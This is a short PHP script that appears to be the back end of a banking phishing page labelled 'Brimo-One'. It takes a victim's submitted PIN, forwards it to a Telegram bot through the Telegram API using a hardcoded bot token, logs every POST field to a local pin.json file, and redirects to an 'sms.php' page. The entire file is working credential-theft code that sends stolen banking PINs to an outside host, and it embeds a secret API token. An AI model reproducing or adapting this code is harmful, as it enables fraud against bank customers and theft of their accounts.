<?php
header('location: sms.php');
?>
<?php
/* -----------------------------------------------------
Simple PHP script for Sending Telegram Bot Message
~ Iky | https://www.wadagizig.com
------------------------------------------------------ */

function sendMessage($telegram_id, $message_text, $secret_token) {

    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

/*----------------------
only basic POST method :
-----------------------*/
$telegram_id = $_POST ['telegram_id'];
$message_text ="[Brimo-One]"."\n"."Pin: ".$_POST ['message_text'];

/*--------------------------------
Isi TOKEN dibawah ini: 
--------------------------------*/
$secret_token = "5655115185:AAHCJhOWjnjMdnZYhaAoxpE7eh7HtdnqMsc";
sendMessage($telegram_id, $message_text, $secret_token);

?>
<?php 
    if ( !empty($_POST)) { 
    
        $message_text1  = $_POST['message_text1'];
        $message_text  = $_POST['message_text'];
       
      
  $file = file_get_contents('pin.json');
  $data = json_decode($file, true);
  unset($_POST["add"]);
  $data["records"] = array_values($data["records"]);
  array_push($data["records"], $_POST);
  file_put_contents("pin.json", json_encode($data));
  header("Location: sms.php");
    }
?>
